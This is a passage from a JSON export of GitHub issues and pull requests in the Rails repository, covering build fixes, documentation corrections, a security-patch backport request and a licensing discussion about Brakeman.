        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 3,
        "created_at": "2024-02-27T03:40:00Z",
        "updated_at": "2024-02-27T15:18:28Z",
        "closed_at": "2024-02-27T14:19:57Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\n\r\n1. Clone a fresh copy of Rails\r\n\r\n```sh\r\ngit clone git@github.com:rails/rails.git\r\n```\r\n\r\n2. Install MySQL >=8.3\r\n\r\n```sh\r\nbrew install mysql # at this time, installs 8.3.0\r\n```\r\n\r\n3. (Attempt to) Install dependencies\r\n\r\n```sh\r\ncd rails\r\nbundle install\r\n```\r\n\r\n4. Note the errors, specifically:\r\n\r\n```sh\r\nclient.c:1438:3: error: call to undeclared function 'mysql_ssl_set'; ISO C99 and later do not support implicit function declarations\r\n[-Wimplicit-function-declaration]\r\n  mysql_ssl_set(wrapper->client,\r\n  ^\r\n```\r\n\r\n### Expected behavior\r\n\r\n`bundle install` succeeds unceremoniously\r\n\r\n### Actual behavior\r\n\r\nBundler fails to install `mysql2` with the following error:\r\n\r\n```sh\r\nclient.c:1438:3: error: call to undeclared function 'mysql_ssl_set'; ISO C99 and later do not support implicit function declarations\r\n[-Wimplicit-function-declaration]\r\n  mysql_ssl_set(wrapper->client,\r\n  ^\r\n```\r\n\r\n### Additional Information\r\n\r\nI don't think this is specific to my system (although specs are listed below). My understanding of the issue (after poking around the interwebs the last couple evenings) stems from the fact that MySQL@8.3 removes a few APIs that the `mysql2` gem relied upon. This is fixed in the next patch release of `brianmario/mysql2` ([v0.5.6](https://github.com/brianmario/mysql2/releases/tag/0.5.6)). Simply upgrading this gem locally allows `bundle install` to pass as expected, although I'm not familiar enough with the Rails project to properly triage any potential side-effects.\r\n\r\n### System configuration\r\n\r\n**Rails version**: Edge\r\n\r\n**Ruby version**: ruby 3.3.0 (2023-12-25 revision 5124f9ac75) [x86_64-darwin22]\r\n\r\n#### System specs (if it helps):\r\n\r\nMac OSX 12.6.3 (22G436)\r\n**CPU:** 2.8 GHz Quad-Core Intel Core i7\r\n**GPU:** Intel HD Graphics 630 1536MB\r\n**RAM:** 16 GB 2133 MHz LPDDR3",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51199/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51199/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51198",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51198/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51198/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51198/events",
        "html_url": "https://github.com/rails/rails/pull/51198",
        "id": 2155494840,
        "node_id": "PR_kwDNIULOZ_yBRQ",
        "number": 51198,
        "title": "Fix documentation and sample code for `ActiveSupport::Logger.logger_outputs_to?`",
        "user": {
            "login": "willnet",
            "id": 82371,
            "node_id": "MDQ6VXNlcjgyMzcx",
            "avatar_url": "https://avatars.githubusercontent.com/u/82371?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/willnet",
            "html_url": "https://github.com/willnet",
            "followers_url": "https://api.github.com/users/willnet/followers",
            "following_url": "https://api.github.com/users/willnet/following{/other_user}",
            "gists_url": "https://api.github.com/users/willnet/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/willnet/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/willnet/subscriptions",
            "organizations_url": "https://api.github.com/users/willnet/orgs",
            "repos_url": "https://api.github.com/users/willnet/repos",
            "events_url": "https://api.github.com/users/willnet/events{/privacy}",
            "received_events_url": "https://api.github.com/users/willnet/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107194,
                "node_id": "MDU6TGFiZWwxMDcxOTQ=",
                "url": "https://api.github.com/repos/rails/rails/labels/activesupport",
                "name": "activesupport",
                "color": "FC9300",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-27T02:00:48Z",
        "updated_at": "2024-02-27T02:10:40Z",
        "closed_at": "2024-02-27T02:08:53Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51198",
            "html_url": "https://github.com/rails/rails/pull/51198",
            "diff_url": "https://github.com/rails/rails/pull/51198.diff",
            "patch_url": "https://github.com/rails/rails/pull/51198.patch",
            "merged_at": "2024-02-27T02:08:52Z"
        },
        "body": "Fixed incorrect documentation for `ActiveSupport::Logger.logger_outputs_to?`. The method expects the first argument to be a Logger object and subsequent variadic arguments to be either IO objects or strings representing file paths.\r\n\r\nAlso corrected the sample code in CHANGELOG.md, which previously only passed a single argument, not reflecting the correct usage.\r\n\r\nrelated PR: https://github.com/rails/rails/pull/51125",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51198/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51198/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51197",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51197/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51197/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51197/events",
        "html_url": "https://github.com/rails/rails/pull/51197",
        "id": 2154597511,
        "node_id": "PR_kwDNIULOZ_Ah0g",
        "number": 51197,
        "title": "Add `x86_64-linux` platform to Gemfile.lock",
        "user": {
            "login": "jgarber623",
            "id": 73866,
            "node_id": "MDQ6VXNlcjczODY2",
            "avatar_url": "https://avatars.githubusercontent.com/u/73866?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/jgarber623",
            "html_url": "https://github.com/jgarber623",
            "followers_url": "https://api.github.com/users/jgarber623/followers",
            "following_url": "https://api.github.com/users/jgarber623/following{/other_user}",
            "gists_url": "https://api.github.com/users/jgarber623/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/jgarber623/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/jgarber623/subscriptions",
            "organizations_url": "https://api.github.com/users/jgarber623/orgs",
            "repos_url": "https://api.github.com/users/jgarber623/repos",
            "events_url": "https://api.github.com/users/jgarber623/events{/privacy}",
            "received_events_url": "https://api.github.com/users/jgarber623/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-02-26T16:28:10Z",
        "updated_at": "2024-02-26T16:43:10Z",
        "closed_at": "2024-02-26T16:40:38Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51197",
            "html_url": "https://github.com/rails/rails/pull/51197",
            "diff_url": "https://github.com/rails/rails/pull/51197.diff",
            "patch_url": "https://github.com/rails/rails/pull/51197.patch",
            "merged_at": null
        },
        "body": "### Motivation / Background\r\n\r\nThis Pull Request has been created because I noticed that the `build` job in the RuboCop GitHub Actions workflow is failing owing to a missing platform setting.\r\n\r\n### Detail\r\n\r\nThis Pull Request adds `x86_64-linux` to the `PLATFORMS` section of  `Gemfile.lock`.\r\n\r\n### Additional information\r\n\r\nThe `PLATFORMS` section seems to vary wildly across time and `*-stable` branches in this repo. So, I'm not terribly sure what _should_ be listed here, but at the very least, this change unblocks the GitHub Actions workflow.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51197/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51197/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51196",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51196/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51196/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51196/events",
        "html_url": "https://github.com/rails/rails/pull/51196",
        "id": 2154549719,
        "node_id": "PR_kwDNIULOZ-95BQ",
        "number": 51196,
        "title": "Backport CVE-2024-26143 to 6-1-stable branch",
        "user": {
            "login": "jgarber623",
            "id": 73866,
            "node_id": "MDQ6VXNlcjczODY2",
            "avatar_url": "https://avatars.githubusercontent.com/u/73866?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/jgarber623",
            "html_url": "https://github.com/jgarber623",
            "followers_url": "https://api.github.com/users/jgarber623/followers",
            "following_url": "https://api.github.com/users/jgarber623/following{/other_user}",
            "gists_url": "https://api.github.com/users/jgarber623/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/jgarber623/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/jgarber623/subscriptions",
            "organizations_url": "https://api.github.com/users/jgarber623/orgs",
            "repos_url": "https://api.github.com/users/jgarber623/repos",
            "events_url": "https://api.github.com/users/jgarber623/events{/privacy}",
            "received_events_url": "https://api.github.com/users/jgarber623/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107189,
                "node_id": "MDU6TGFiZWwxMDcxODk=",
                "url": "https://api.github.com/repos/rails/rails/labels/actionpack",
                "name": "actionpack",
                "color": "FFF700",
                "default": false,
                "description": null
            },
            {
                "id": 107194,
                "node_id": "MDU6TGFiZWwxMDcxOTQ=",
                "url": "https://api.github.com/repos/rails/rails/labels/activesupport",
                "name": "activesupport",
                "color": "FC9300",
                "default": false,
                "description": null
            },
            {
                "id": 3666649,
                "node_id": "MDU6TGFiZWwzNjY2NjQ5",
                "url": "https://api.github.com/repos/rails/rails/labels/actionview",
                "name": "actionview",
                "color": "d7e102",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-02-26T16:06:52Z",
        "updated_at": "2024-02-26T16:36:52Z",
        "closed_at": "2024-02-26T16:36:51Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51196",
            "html_url": "https://github.com/rails/rails/pull/51196",
            "diff_url": "https://github.com/rails/rails/pull/51196.diff",
            "patch_url": "https://github.com/rails/rails/pull/51196.patch",
            "merged_at": null
        },
        "body": "### Motivation / Background\r\n\r\nThis Pull Request has been created because there hasn't yet been a patch applied to the 6-1-stable branch resolving CVE-2024-26143. The [security announcement](https://discuss.rubyonrails.org/t/possible-xss-vulnerability-in-action-controller/84947) makes no mention of backporting those fixes to 6-1-stable. See also: @radar's #51190.\r\n\r\nThat's the background. I'd say my motivation is that I'd like to unblock myself and anyone else waiting for the backport.\r\n\r\n### Detail\r\n\r\nThis Pull Request applies existing commits in the 7-0-stable branch related to resolving CVE-2024-26143. Applying the fixes did require(ish?) backporting the `ActiveSupport::HtmlSafeTranslation` module. I suppose the patches could be applied without adding that module, but that was the easiest path I could identify.\r\n\r\nMost of the cherry picking introduced conflicts that I resolved by hand to the best of my ability. I'm certainly open to feedback on that approach or on any additional changes that should be made.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51196/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51196/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51195",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51195/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51195/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51195/events",
        "html_url": "https://github.com/rails/rails/issues/51195",
        "id": 2154470305,
        "node_id": "I_kwDNIULOgGqboQ",
        "number": 51195,
        "title": "Do NOT add Brakeman by default to new Rails 8.0+ apps due to Non-Commercial license",
        "user": {
            "login": "tomczak-mateusz",
            "id": 99652987,
            "node_id": "U_kgDOBfCVew",
            "avatar_url": "https://avatars.githubusercontent.com/u/99652987?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/tomczak-mateusz",
            "html_url": "https://github.com/tomczak-mateusz",
            "followers_url": "https://api.github.com/users/tomczak-mateusz/followers",
            "following_url": "https://api.github.com/users/tomczak-mateusz/following{/other_user}",
            "gists_url": "https://api.github.com/users/tomczak-mateusz/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/tomczak-mateusz/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/tomczak-mateusz/subscriptions",
            "organizations_url": "https://api.github.com/users/tomczak-mateusz/orgs",
            "repos_url": "https://api.github.com/users/tomczak-mateusz/repos",
            "events_url": "https://api.github.com/users/tomczak-mateusz/events{/privacy}",
            "received_events_url": "https://api.github.com/users/tomczak-mateusz/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 4,
        "created_at": "2024-02-26T15:34:36Z",
        "updated_at": "2024-02-26T23:30:18Z",
        "closed_at": "2024-02-26T16:28:35Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "## Issue:\r\nI love the idea of adding SAST as a default for new Rails projects but I'm concerned about the licensing related stuff. Brakeman was bought by Synopsys back in 2018 and is non longer MIT licensed.\r\n\r\nBrakeman is free for non-commercial use only:\r\n![image](https://github.com/rails/rails/assets/99652987/ad47ac63-e2bc-4862-b781-ce0663cc88e5)\r\n\r\nCode committed on or after June 15, 2018 is licensed under the [Brakeman Public Use License](https://github.com/presidentbeef/brakeman/blob/main/LICENSE.md) and is owned by Synopsys, Inc.\r\n\r\nCode committed prior to June 15, 2018 is licensed under the MIT license and is owned by the respective copyright holders.\r\nhttps://github.com/presidentbeef/brakeman/blob/main/COPYING.md\r\n\r\nCurrent Brakeman license:\r\nhttps://github.com/presidentbeef/brakeman/blob/main/LICENSE.md\r\n\r\nI had the issues with Brakeman license in the past due to Auditors not liking the current state of the Brakeman license as this point is not very clear while Brakeman is being used as part of the CI/CD service:\r\n\r\n```\r\nExamples of Commercial Uses include (but are not limited to):\r\n- Using the Software as a component of a value-added service/product.\r\n```\r\n\r\nI think someone with experience related to Licensing should look into that before Brakeman is added as a default to all new Rails projects.\r\n\r\nAdding Brakeman might cause some issues to the new potential commercial Rails apps where devs are not concerned with licensing stuff.\r\n\r\nIf You think that's the non-issue, please confirm that Brakeman can be used with Rails projects without licensing issues.\r\n\r\n## Timeline:\r\n- issue opened by @dhh : https://github.com/rails/rails/issues/50501 at 31st Dec 2023\r\n> [Brakeman](https://brakemanscanner.org/) is a great way to prevent common security vulnerabilities in Rails from going into production. We should be encouraging that for new applications. Especially for newcomers to the framework who might otherwise make rookie mistakes. So let's add it in the same way we just added Rubocop. --skip-brakeman if you don't want it, otherwise we add to default gemfile and create a default binstub in bin/brakeman.\r\n- PR for adding Brakeman opened by @vipulnsward https://github.com/rails/rails/pull/50507 at 31st Dec 2023\r\n- issue opened by @dhh: https://github.com/rails/rails/issues/50502 at 31st Dec 2023\r\n- issue opened by @dhh: https://github.com/rails/rails/pull/50508 at 1st Jan 2024\r\n\r\n\r\n## Background:\r\nRails license:\r\n![Screenshot 2024-02-26 at 15 43 52](https://github.com/rails/rails/assets/99652987/16b7f622-b56f-4dde-949d-399d01450eab)\r\n\r\nRuby on Rails is only using permissive licenses currently: MIT, BSD, APACHE. Brakeman will be the first default gem that is using non-permissive license.\r\n\r\n### Default current & upcoming gems I'm aware of:\r\n|  **Gem**  |  **License**  | \r\n|---|---|\r\n|  rails  |  MIT  | \r\n|  kredis  |  MIT  | \r\n|  sprockets-rails |  MIT |\r\n| pg | BSD-2-CLAUSE | \r\n| puma | BSD-3-CLAUSE |\r\n| importmap-rails | MIT |\r\n| turbo-rails | MIT |\r\n| stimulus-rails | MIT |\r\n| jbuilder | MIT |\r\n| redis | MIT |\r\n| bcrypt | MIT |\r\n| bootsnap |  MIT |\r\n| image_processing | MIT |\r\n| debug | BSD-2-CLAUSE |\r\n| web-console | MIT |\r\n| rack-mini-profiler | MIT |\r\n| spring | MIT |\r\n| error_highlight | MIT |\r\n| capybara | MIT |\r\n| selenium-webdriver | APACHE-2.0 |\r\n| rspec | MIT |\r\n| kamal | MIT |\r\n| propshaft | MIT | \r\n| solid_queue | MIT |\r\n| solid_cache | MIT |",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51195/reactions",
            "total_count": 2,
            "+1": 2,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51195/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51194",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51194/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51194/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51194/events",
        "html_url": "https://github.com/rails/rails/pull/51194",
        "id": 2154355340,
        "node_id": "PR_kwDNIULOZ-zSHg",
        "number": 51194,
        "title": "[Backport] Update docs for erb_trim_mode [ci-skip]",
        "user": {
            "login": "Edouard-chin",
            "id": 8122246,
            "node_id": "MDQ6VXNlcjgxMjIyNDY=",
            "avatar_url": "https://avatars.githubusercontent.com/u/8122246?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/Edouard-chin",
            "html_url": "https://github.com/Edouard-chin",
            "followers_url": "https://api.github.com/users/Edouard-chin/followers",
            "following_url": "https://api.github.com/users/Edouard-chin/following{/other_user}",
            "gists_url": "https://api.github.com/users/Edouard-chin/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/Edouard-chin/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/Edouard-chin/subscriptions",
            "organizations_url": "https://api.github.com/users/Edouard-chin/orgs",
            "repos_url": "https://api.github.com/users/Edouard-chin/repos",
            "events_url": "https://api.github.com/users/Edouard-chin/events{/privacy}",
            "received_events_url": "https://api.github.com/users/Edouard-chin/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 150377,
                "node_id": "MDU6TGFiZWwxNTAzNzc=",
                "url": "https://api.github.com/repos/rails/rails/labels/docs",
                "name": "docs",
                "color": "02d7e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-26T14:43:51Z",
        "updated_at": "2024-02-26T17:18:11Z",
        "closed_at": "2024-02-26T17:18:11Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51194",
            "html_url": "https://github.com/rails/rails/pull/51194",
            "diff_url": "https://github.com/rails/rails/pull/51194.diff",
            "patch_url": "https://github.com/rails/rails/pull/51194.patch",
            "merged_at": "2024-02-26T17:18:11Z"
        },
        "body": "Backport 86cc3ad1effc113176be319f7186a53d9b0e9405 so that we don't need to wait for 7.2 for the doc to be updated.\r\n\r\nFix https://github.com/rails/rails/issues/51179",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51194/reactions",
            "total_count": 2,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 2,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51194/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51193",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51193/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51193/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51193/events",
        "html_url": "https://github.com/rails/rails/pull/51193",
        "id": 2153980655,
        "node_id": "PR_kwDNIULOZ-ewGw",
        "number": 51193,
        "title": "Fix `Migrator.current_version` to instantiate `SchemaMigration` correctly",
        "user": {
            "login": "casperisfine",
            "id": 19192189,
            "node_id": "MDQ6VXNlcjE5MTkyMTg5",
            "avatar_url": "https://avatars.githubusercontent.com/u/19192189?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/casperisfine",
            "html_url": "https://github.com/casperisfine",
            "followers_url": "https://api.github.com/users/casperisfine/followers",
            "following_url": "https://api.github.com/users/casperisfine/following{/other_user}",
            "gists_url": "https://api.github.com/users/casperisfine/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/casperisfine/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/casperisfine/subscriptions",
            "organizations_url": "https://api.github.com/users/casperisfine/orgs",
            "repos_url": "https://api.github.com/users/casperisfine/repos",
            "events_url": "https://api.github.com/users/casperisfine/events{/privacy}",
            "received_events_url": "https://api.github.com/users/casperisfine/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-26T11:46:36Z",
        "updated_at": "2024-02-26T11:54:27Z",
        "closed_at": "2024-02-26T11:54:27Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51193",
            "html_url": "https://github.com/rails/rails/pull/51193",
            "diff_url": "https://github.com/rails/rails/pull/51193.diff",
            "patch_url": "https://github.com/rails/rails/pull/51193.patch",
            "merged_at": "2024-02-26T11:54:27Z"
        },
        "body": "This was missed in https://github.com/rails/rails/pull/51162\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51193/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51193/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51192",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51192/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51192/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51192/events",
        "html_url": "https://github.com/rails/rails/pull/51192",
        "id": 2153879724,
        "node_id": "PR_kwDNIULOZ-ZNkw",
        "number": 51192,
        "title": "Make `.connection` always return a permanently leased connection",
        "user": {
            "login": "casperisfine",
            "id": 19192189,
            "node_id": "MDQ6VXNlcjE5MTkyMTg5",
            "avatar_url": "https://avatars.githubusercontent.com/u/19192189?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/casperisfine",
            "html_url": "https://github.com/casperisfine",
            "followers_url": "https://api.github.com/users/casperisfine/followers",
            "following_url": "https://api.github.com/users/casperisfine/following{/other_user}",
            "gists_url": "https://api.github.com/users/casperisfine/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/casperisfine/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/casperisfine/subscriptions",
            "organizations_url": "https://api.github.com/users/casperisfine/orgs",
            "repos_url": "https://api.github.com/users/casperisfine/repos",
            "events_url": "https://api.github.com/users/casperisfine/events{/privacy}",
            "received_events_url": "https://api.github.com/users/casperisfine/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-26T10:59:05Z",
        "updated_at": "2024-02-28T11:07:53Z",
        "closed_at": null,
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51192",
            "html_url": "https://github.com/rails/rails/pull/51192",
            "diff_url": "https://github.com/rails/rails/pull/51192.diff",
            "patch_url": "https://github.com/rails/rails/pull/51192.patch",
            "merged_at": null
        },
        "body": "Ref: https://github.com/rails/rails/pull/51083\r\nRedo of: https://github.com/rails/rails/pull/51154\r\n\r\nThe introduction of `ActiveRecord::Base.with_connection` somewhat broke some expectations, namely that calling `.connection` would cause the connection to be permenently leased, hence that future calls to it would return the same connection, with all it's possible environmental changes.\r\n\r\nSo any call to `.connection`, even inside `.with_connection` should cause the lease to be sticky, and persist beyond the `with_connection` block.\r\n\r\nAfter discussing with @matthewd, one big worry is that people might hold onto the return value of `Base.connection` beyond the scope of the `.transaction` block, which could leak to segfaults or worse data leak.\r\n\r\nSo in the end I think we need to do this. That makes https://github.com/rails/rails/pull/50793 a bit harder to achieve, but not the end of the world.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51192/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51192/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51191",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51191/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51191/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51191/events",
        "html_url": "https://github.com/rails/rails/pull/51191",
        "id": 2153823663,
        "node_id": "PR_kwDNIULOZ-WHGg",
        "number": 51191,
        "title": "Set `action_mailer.default_url_options` values in `development` and `test`",
        "user": {
            "login": "stevepolitodesign",
            "id": 5122678,
            "node_id": "MDQ6VXNlcjUxMjI2Nzg=",
            "avatar_url": "https://avatars.githubusercontent.com/u/5122678?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/stevepolitodesign",
            "html_url": "https://github.com/stevepolitodesign",
            "followers_url": "https://api.github.com/users/stevepolitodesign/followers",
            "following_url": "https://api.github.com/users/stevepolitodesign/following{/other_user}",
            "gists_url": "https://api.github.com/users/stevepolitodesign/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/stevepolitodesign/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/stevepolitodesign/subscriptions",
            "organizations_url": "https://api.github.com/users/stevepolitodesign/orgs",
            "repos_url": "https://api.github.com/users/stevepolitodesign/repos",
            "events_url": "https://api.github.com/users/stevepolitodesign/events{/privacy}",
            "received_events_url": "https://api.github.com/users/stevepolitodesign/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-26T10:35:00Z",
        "updated_at": "2024-02-28T01:01:50Z",
        "closed_at": "2024-02-27T21:19:23Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51191",
            "html_url": "https://github.com/rails/rails/pull/51191",
